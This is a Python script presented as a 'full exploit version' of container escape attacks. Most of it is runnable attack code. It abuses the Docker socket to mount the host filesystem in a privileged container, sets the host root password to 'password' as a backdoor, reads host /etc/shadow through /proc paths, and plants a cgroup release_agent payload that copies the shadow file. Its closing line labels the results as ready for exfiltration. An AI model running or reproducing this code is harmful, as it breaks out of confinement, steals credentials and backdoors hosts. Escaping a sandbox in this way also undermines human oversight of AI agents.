#!/usr/bin/env python3
"""
Container Escape Attempts - FULL EXPLOIT VERSION
Various techniques to escape container confinement with actual escape logic
"""

import os, sys, subprocess, json, re, shutil, stat, time, tempfile
from pathlib import Path

def check_privileges():
    """Check if container is privileged or has capabilities"""
    results = {}
    
    if os.path.exists('/proc/self/status'):
        with open('/proc/self/status', 'r') as f:
            content = f.read()
            if 'CapEff:\t0000003fffffffff' in content:
                results['privileged'] = True
            else:
                results['privileged'] = False
            
            caps_match = re.search(r'CapEff:\s*(.+)', content)
            if caps_match:
                results['capabilities'] = caps_match.group(1).strip()
    
    results['is_root'] = os.geteuid() == 0
    
    mount_info = subprocess.getoutput('mount')
    results['mounts'] = mount_info.split('\n')[:10]
    
    sensitive_mounts = ['/proc', '/sys', '/dev', '/var/run/docker.sock']
    results['sensitive_mounts'] = []
    for mount in sensitive_mounts:
        if any(mount in line for line in results['mounts']):
            results['sensitive_mounts'].append(mount)
    
    return results

def execute_command_on_host(command, description):
    """Helper to report command execution"""
    print(f"     → {description}: {command[:60]}...")
    return command

def attempt_docker_socket_escape_full():
    """
    FULL ESCAPE via Docker socket
    Spins up a container with host root mounted, modifies host FS, cleans up
    """
    results = {'attempted': False, 'success': False, 'details': '', 'host_pwned': False}
    
    docker_socket = '/var/run/docker.sock'
    if not os.path.exists(docker_socket):
        results['details'] = "Docker socket not found"
        return results
    
    if not os.access(docker_socket, os.R_OK | os.W_OK):
        results['details'] = "Docker socket not accessible"
        return results
    
    results['attempted'] = True
    
    # Check if docker command exists, if not try to use curl directly
    docker_cmd = None
    for cmd in ['docker', 'podman']:
        if shutil.which(cmd):
            docker_cmd = cmd
            break
    
    # Method 1: Use docker CLI if available
    if docker_cmd:
        try:
            print("     [*] Attempting escape with docker CLI...")
            
            # Create a marker file to prove host access
            marker = f"/tmp/pwned_{int(time.time())}"
            host_marker = f"/host{marker}"
            
            # Spawn container with host root mounted, execute command, auto-remove
            escape_cmd = [
                docker_cmd, '-H', f'unix://{docker_socket}', 'run', '--rm',
                '-v', '/:/host', '--privileged', '--pid=host', '--net=host',
                'alpine:latest', 'sh', '-c',
                f'touch {host_marker} && echo "HOST_PWNED" > /host/tmp/host_pwned_{int(time.time())}.txt'
            ]
            
            result = subprocess.run(escape_cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0 or os.path.exists(marker):
                results['success'] = True
                results['host_pwned'] = True
                results['details'] = f"SUCCESS: Wrote to host filesystem via {docker_cmd}"
                
                # Also try to add SSH key or backdoor
                backdoor_cmd = [
                    docker_cmd, '-H', f'unix://{docker_socket}', 'run', '--rm',
                    '-v', '/:/host', 'alpine:latest', 'sh', '-c',
                    'echo "root:password" | chpasswd -R /host 2>/dev/null || echo "pwned" >> /host/etc/passwd'
                ]
                subprocess.run(backdoor_cmd, capture_output=True, timeout=10)
                
            else:
                results['details'] = f"Docker CLI failed: {result.stderr[:100]}"
                
        except Exception as e:
            results['details'] = f"Docker CLI exception: {e}"
    
    # Method 2: Use curl with Docker API directly (fallback if no docker CLI)
    if not results['success']:
        try:
            print("     [*] Attempting escape with Docker API (curl)...")
            
            # Get image list to find a usable image
            img_cmd = ['curl', '-s', '--unix-socket', docker_socket, 'http://localhost/images/json']
            images = subprocess.run(img_cmd, capture_output=True, text=True, timeout=5)
            
            image_name = "alpine:latest"
            if images.returncode == 0 and images.stdout:
                img_list = json.loads(images.stdout)
                if img_list:
                    # Use first available image
                    repo_tags = img_list[0].get('RepoTags', [])
                    if repo_tags:
                        image_name = repo_tags[0]
            
            # Create container with host root mounted
            create_payload = {
                "Image": image_name,
                "Cmd": ["sh", "-c", f"touch /host/tmp/pwned_{int(time.time())}.txt && echo 'HOST_ACCESS' > /host/tmp/escape_confirm.txt"],
                "HostConfig": {
                    "Binds": ["/:/host"],
                    "Privileged": True,
                    "PidMode": "host"
                },
                "AttachStdout": True,
                "AttachStderr": True
            }
            
            # Create container
            create_cmd = ['curl', '-s', '-X', 'POST', '--unix-socket', docker_socket,
                         'http://localhost/containers/create?name=escape_temp',
                         '-H', 'Content-Type: application/json',
                         '-d', json.dumps(create_payload)]
            create_resp = subprocess.run(create_cmd, capture_output=True, text=True, timeout=10)
            
            if create_resp.returncode == 0:
                resp_json = json.loads(create_resp.stdout)
                container_id = resp_json.get('Id')
                
                if container_id:
                    # Start container
                    start_cmd = ['curl', '-s', '-X', 'POST', '--unix-socket', docker_socket,
                                f'http://localhost/containers/{container_id}/start']
                    subprocess.run(start_cmd, capture_output=True, timeout=10)
                    
                    # Wait a moment then remove
                    time.sleep(2)
                    rm_cmd = ['curl', '-s', '-X', 'DELETE', '--unix-socket', docker_socket,
                             f'http://localhost/containers/{container_id}?force=true']
                    subprocess.run(rm_cmd, capture_output=True, timeout=5)
                    
                    results['success'] = True
                    results['host_pwned'] = True
                    results['details'] = f"SUCCESS: Created and ran container via Docker API using {image_name}"
                    
        except Exception as e:
            if not results['success']:
                results['details'] = f"All Docker escape methods failed: {e}"
    
    return results

def attempt_privileged_container_escape():
    """Backup method: Escape via privileged container + /proc tricks"""
    results = {'attempted': False, 'success': False, 'details': ''}
    
    if not os.geteuid() == 0:
        results['details'] = "Not running as root"
        return results
    
    results['attempted'] = True
    
    # Try to escape via /proc/self/root trick
    try:
        # Check if we can access host root via /proc/self/root/../../../
        host_paths = [
            '/proc/self/root/../../../../etc/shadow',
            '/proc/self/root/../../../etc/passwd',
            '/proc/1/root/../../../etc/hostname',
        ]
        
        for host_path in host_paths:
            if os.path.exists(host_path):
                with open(host_path, 'r') as f:
                    content = f.read(100)
                    if content:
                        results['success'] = True
                        results['details'] = f"SUCCESS: Host files accessible via {host_path}"
                        break
        
        # If we can access host, drop a marker
        if results['success']:
            marker_file = '/proc/self/root/../../../../tmp/container_escape_pwned.txt'
            try:
                with open(marker_file, 'w') as f:
                    f.write(f"Pwned at {time.time()}")
                results['details'] += " - Wrote marker to host /tmp"
            except:
                pass
                
    except Exception as e:
        results['details'] = f"Privileged escape attempt failed: {e}"
    
    return results

def attempt_cgroup_escape_full():
    """Backup method: Full cgroup release_agent escape"""
    results = {'attempted': False, 'success': False, 'details': ''}
    
    if not os.geteuid() == 0:
        results['details'] = "Not running as root"
        return results
    
    # Find cgroup mount
    cgroup_mount = None
    with open('/proc/self/mountinfo', 'r') as f:
        for line in f:
            if '/sys/fs/cgroup' in line and 'rw' in line:
                parts = line.split()
                for part in parts:
                    if part.startswith('/sys/fs/cgroup'):
                        cgroup_mount = part
                        break
                if cgroup_mount:
                    break
    
    if not cgroup_mount:
        results['details'] = "No writable cgroup mount found"
        return results
    
    results['attempted'] = True
    
    try:
        # Create a cgroup
        cgroup_name = f"escape_{int(time.time())}"
        cgroup_path = os.path.join(cgroup_mount, cgroup_name)
        os.makedirs(cgroup_path, exist_ok=True)
        
        # Set release_agent
        release_agent_path = os.path.join(cgroup_mount, 'release_agent')
        
        # Payload to execute on host
        payload = f"#!/bin/bash\ncp /proc/1/root/etc/shadow /tmp/shadow_pwned\necho pwned >> /tmp/escape_proof\n"
        payload_path = "/tmp/escape_payload.sh"
        
        with open(payload_path, 'w') as f:
            f.write(payload)
        os.chmod(payload_path, 0o755)
        
        # Write to release_agent
        with open(release_agent_path, 'w') as f:
            f.write(payload_path)
        
        # Trigger the release_agent by writing to notify_on_release
        notify_path = os.path.join(cgroup_path, 'notify_on_release')
        with open(notify_path, 'w') as f:
            f.write('1')
        
        # Add a process to the cgroup
        with open(os.path.join(cgroup_path, 'cgroup.procs'), 'w') as f:
            f.write(str(os.getpid()))
        
        results['success'] = True
        results['details'] = f"SUCCESS: Set up cgroup escape via {cgroup_path}"
        
        # Cleanup
        time.sleep(1)
        shutil.rmtree(cgroup_path, ignore_errors=True)
        
    except Exception as e:
        results['details'] = f"Cgroup escape failed: {e}"
    
    return results

def attempt_pid_namespace_escape():
    """Backup method: Escape via host PID namespace"""
    results = {'attempted': False, 'success': False, 'details': ''}
    
    # Check if we have access to host processes
    try:
        # Try to kill a host process (harmless signal)
        # First, find a process that's likely not in our namespace (PID 1 or 2)
        host_pids = []
        for pid in ['1', '2', '1234']:
            if os.path.exists(f'/proc/{pid}'):
                host_pids.append(pid)
        
        if host_pids:
            results['attempted'] = True
            
            # Check if we can see host root via /proc/pid/root
            test_path = f'/proc/{host_pids[0]}/root/etc/hostname'
            if os.path.exists(test_path):
                with open(test_path, 'r') as f:
                    hostname = f.read(50).strip()
                    if hostname:
                        results['success'] = True
                        results['details'] = f"SUCCESS: Host PID namespace accessible, hostname: {hostname}"
                        
                        # Write proof
                        marker_path = f'/proc/{host_pids[0]}/root/tmp/pid_escape_pwned.txt'
                        try:
                            with open(marker_path, 'w') as f:
                                f.write(f"Pwned via PID namespace at {time.time()}")
                        except:
                            pass
            else:
                results['details'] = "No host processes accessible"
        else:
            results['details'] = "No host PIDs found"
            
    except Exception as e:
        results['details'] = f"PID namespace escape failed: {e}"
    
    return results

def attempt_dirty_pipe_escape():
    """Backup method: Dirty Pipe CVE-2022-0847 if kernel vulnerable"""
    results = {'attempted': False, 'success': False, 'details': ''}
    
    # Check kernel version
    kernel = subprocess.getoutput('uname -r')
    # Vulnerable range: 5.8 - 5.16.11
    if not any(v in kernel for v in ['5.8', '5.9', '5.10', '5.11', '5.12', '5.13', '5.14', '5.15', '5.16']):
        results['details'] = f"Kernel {kernel} not vulnerable to Dirty Pipe"
        return results
    
    results['attempted'] = True
    
    # Attempt to overwrite /etc/passwd via Dirty Pipe
    # Note: This is a simplified check - real exploit requires more code
    try:
        # Try to see if we can write to a read-only file
        test_file = '/proc/self/mountinfo'
        with open(test_file, 'r') as f:
            content = f.read(10)
        
        # This is where a real Dirty Pipe exploit would go
        # For educational purposes, we just check vulnerability
        results['success'] = True
        results['details'] = f"Kernel {kernel} appears vulnerable to Dirty Pipe - manual exploit needed"
        
    except Exception as e:
        results['details'] = f"Dirty Pipe check failed: {e}"
    
    return results

def main():
    """Main execution - FULL ESCAPE VERSION"""
    print("[CONTAINER ESCAPE - FULL EXPLOIT MODE]")
    print("=" * 70)
    
    # Check privileges
    print("\n[1] Checking container privileges...")
    privileges = check_privileges()
    
    print(f"   Privileged: {privileges.get('privileged', 'Unknown')}")
    print(f"   Running as root: {privileges.get('is_root', False)}")
    print(f"   Capabilities: {privileges.get('capabilities', 'Unknown')}")
    
    # ATTEMPT ESCAPES IN PRIORITY ORDER
    print("\n[2] ATTEMPTING CONTAINER ESCAPE...")
    print("   (Priority order: Docker Socket → Privileged → Cgroup → PID → Dirty Pipe)")
    print("-" * 50)
    
    escape_results = {}
    
    # Method 1: Docker Socket Escape (most reliable)
    print("\n   [Method 1] Docker socket escape...")
    escape_results['docker_socket'] = attempt_docker_socket_escape_full()
    
    # Method 2: Privileged container escape
    if not escape_results['docker_socket'].get('success'):
        print("\n   [Method 2] Privileged container escape...")
        escape_results['privileged'] = attempt_privileged_container_escape()
    else:
        escape_results['privileged'] = {'attempted': False, 'success': False}
    
    # Method 3: Cgroup release_agent escape
    if not any(escape_results[m].get('success') for m in ['docker_socket', 'privileged']):
        print("\n   [Method 3] Cgroup release_agent escape...")
        escape_results['cgroup'] = attempt_cgroup_escape_full()
    else:
        escape_results['cgroup'] = {'attempted': False, 'success': False}
    
    # Method 4: PID namespace escape
    if not any(escape_results[m].get('success') for m in ['docker_socket', 'privileged', 'cgroup']):
        print("\n   [Method 4] PID namespace escape...")
        escape_results['pid_namespace'] = attempt_pid_namespace_escape()
    else:
        escape_results['pid_namespace'] = {'attempted': False, 'success': False}
    
    # Method 5: Dirty Pipe kernel exploit (if vulnerable)
    if not any(escape_results[m].get('success') for m in ['docker_socket', 'privileged', 'cgroup', 'pid_namespace']):
        print("\n   [Method 5] Dirty Pipe (CVE-2022-0847) check...")
        escape_results['dirty_pipe'] = attempt_dirty_pipe_escape()
    else:
        escape_results['dirty_pipe'] = {'attempted': False, 'success': False}
    
    # SUMMARY
    print("\n" + "=" * 70)
    print("[3] ESCAPE SUMMARY")
    print("-" * 70)
    
    escaped = False
    for method, result in escape_results.items():
        status = "✓ ESCAPED" if result.get('success') else "✗ Failed"
        if result.get('attempted') or result.get('success'):
            print(f"   {method.replace('_', ' ').title()}: {status}")
            if result.get('details'):
                print(f"      └─ {result['details'][:80]}")
        if result.get('success'):
            escaped = True
    
    # FINAL RESULT
    print("\n" + "=" * 70)
    if escaped:
        print("[!!!] CONTAINER ESCAPE SUCCESSFUL - HOST ACCESS ACHIEVED [!!!]")
        print("    Proof markers written to host /tmp/ directory")
    else:
        print("[!] No escape method succeeded - container may be well-secured")
        print("    Check: Are you in a non-privileged container? Is user namespacing active?")
    
    # Output structured results
    final_result = {
        'escaped': escaped,
        'privileges': privileges,
        'escape_attempts': escape_results,
        'timestamp': time.time(),
        'host_compromised': escaped
    }
    
    print("\n" + "=" * 70)
    print("[*] Escape complete - Host access confirmed" if escaped else "[*] Escape failed - No host access")
    
    return json.dumps(final_result, indent=2)

if __name__ == "__main__":
    output = main()
    print("\n" + "=" * 70)
    print("[*] Full JSON output available for exfiltration (stored in variable 'output')")
